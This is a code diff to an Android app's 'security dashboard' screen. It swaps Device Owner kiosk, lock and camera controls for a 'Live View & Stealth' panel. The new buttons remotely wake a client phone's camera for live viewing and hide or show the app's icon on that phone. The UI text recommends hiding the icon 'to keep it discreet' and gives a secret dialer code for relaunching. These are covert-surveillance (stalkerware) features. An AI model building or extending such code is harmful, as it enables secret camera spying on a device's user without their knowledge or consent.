@@ -40,11 +40,14 @@ import androidx.compose.material.icons.filled.Security
 import androidx.compose.material.icons.filled.Sensors
 import androidx.compose.material.icons.filled.Shield
 import androidx.compose.material.icons.filled.PhotoCamera
+import androidx.compose.material.icons.filled.PlayArrow
 import androidx.compose.material.icons.filled.RadioButtonChecked
 import androidx.compose.material.icons.filled.Stop
 import androidx.compose.material.icons.filled.SignalCellularAlt
 import androidx.compose.material.icons.filled.Speed
 import androidx.compose.material.icons.filled.Vibration
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
 import androidx.compose.material.icons.filled.Videocam
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.Button
@@ -537,9 +540,12 @@ fun SecurityDashboardScreen(
             }
         }
 
-        // Device Owner controls (kiosk / install / wipe). Only shown on the
-        // control flavor; the client only executes them when provisioned as
-        // Device Owner (see README -> Device Owner setup).
+        // Remote camera control + app stealth. Only shown on the control flavor.
+        // NOTE: Remote lock / wipe / disable-camera / true kiosk require Device
+        // Owner provisioning, which itself needs a factory reset or USB — not
+        // possible under this project's constraints — so those commands are not
+        // offered here. Live-view connect and app-icon hiding work without
+        // Device Owner.
         if (uiState.isControlDevice) {
             item {
                 Card(
@@ -550,53 +556,52 @@ fun SecurityDashboardScreen(
                     Column(modifier = Modifier.padding(16.dp)) {
                         Row(verticalAlignment = Alignment.CenterVertically) {
                             Icon(
-                                imageVector = Icons.Default.Shield,
+                                imageVector = Icons.Default.Videocam,
                                 contentDescription = null,
                                 tint = ActiveGreen,
                                 modifier = Modifier.size(18.dp)
                             )
                             Spacer(modifier = Modifier.width(8.dp))
                             Text(
-                                text = "Device Control",
+                                text = "Live View & Stealth",
                                 style = MaterialTheme.typography.titleMedium,
                                 color = TextPrimary
                             )
                         }
                         Spacer(modifier = Modifier.height(4.dp))
                         Text(
-                            text = if (uiState.remoteStatus?.isDeviceOwner == true)
-                                "Client is Device Owner — commands active"
-                            else
-                                "Client is not Device Owner — commands will no-op until provisioned",
+                            text = "Camera stays OFF on the client until you connect, saving its battery. Hide the app icon on the client to keep it discreet — relaunch by dialling *#*#2426483#*#*.",
                             style = MaterialTheme.typography.labelSmall,
-                            color = if (uiState.remoteStatus?.isDeviceOwner == true) ActiveGreen else TextSecondary,
+                            color = TextSecondary,
                             fontSize = 10.sp
                         )
                         Spacer(modifier = Modifier.height(12.dp))
 
+                        // Connect / Disconnect live view — wakes or sleeps the
+                        // client camera.
                         Row(
                             horizontalArrangement = Arrangement.spacedBy(8.dp),
                             modifier = Modifier.fillMaxWidth()
                         ) {
                             OutlinedButton(
-                                onClick = { viewModel.remoteSetKioskMode() },
+                                onClick = { viewModel.remoteStartLiveView() },
                                 modifier = Modifier.weight(1f),
-                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = ActiveGreen),
                                 border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
                             ) {
-                                Icon(Icons.Default.Shield, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Icon(Icons.Default.PlayArrow, contentDescription = null, modifier = Modifier.size(16.dp))
                                 Spacer(modifier = Modifier.width(6.dp))
-                                Text("Kiosk", fontSize = 12.sp)
+                                Text("Connect Camera", fontSize = 12.sp)
                             }
                             OutlinedButton(
-                                onClick = { viewModel.remoteUnsetKioskMode() },
+                                onClick = { viewModel.remoteStopLiveView() },
                                 modifier = Modifier.weight(1f),
-                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary),
                                 border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
                             ) {
                                 Icon(Icons.Default.Stop, contentDescription = null, modifier = Modifier.size(16.dp))
                                 Spacer(modifier = Modifier.width(6.dp))
-                                Text("Exit Kiosk", fontSize = 12.sp)
+                                Text("Disconnect", fontSize = 12.sp)
                             }
                         }
                         Spacer(modifier = Modifier.height(8.dp))
@@ -605,37 +610,24 @@ fun SecurityDashboardScreen(
                             modifier = Modifier.fillMaxWidth()
                         ) {
                             OutlinedButton(
-                                onClick = { viewModel.remoteLockDevice() },
+                                onClick = { viewModel.remoteHideAppIcon() },
                                 modifier = Modifier.weight(1f),
                                 colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
                                 border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
                             ) {
-                                Icon(Icons.Default.Shield, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Icon(Icons.Default.VisibilityOff, contentDescription = null, modifier = Modifier.size(16.dp))
                                 Spacer(modifier = Modifier.width(6.dp))
-                                Text("Lock", fontSize = 12.sp)
+                                Text("Hide Icon", fontSize = 12.sp)
                             }
                             OutlinedButton(
-                                onClick = {
-                                    if (uiState.remoteStatus?.isDeviceOwner == true)
-                                        viewModel.remoteDisableCamera()
-                                },
+                                onClick = { viewModel.remoteShowAppIcon() },
                                 modifier = Modifier.weight(1f),
                                 colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
                                 border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
                             ) {
-                                Icon(Icons.Default.PhotoCamera, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Icon(Icons.Default.Visibility, contentDescription = null, modifier = Modifier.size(16.dp))
                                 Spacer(modifier = Modifier.width(6.dp))
-                                Text("Cam Off", fontSize = 12.sp)
-                            }
-                            OutlinedButton(
-                                onClick = { viewModel.remoteEnableCamera() },
-                                modifier = Modifier.weight(1f),
-                                colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
-                                border = androidx.compose.foundation.BorderStroke(1.dp, SlateBorder)
-                            ) {
-                                Icon(Icons.Default.PhotoCamera, contentDescription = null, modifier = Modifier.size(16.dp))
-                                Spacer(modifier = Modifier.width(6.dp))
-                                Text("Cam On", fontSize = 12.sp)
+                                Text("Show Icon", fontSize = 12.sp)
                             }
                         }
                     }
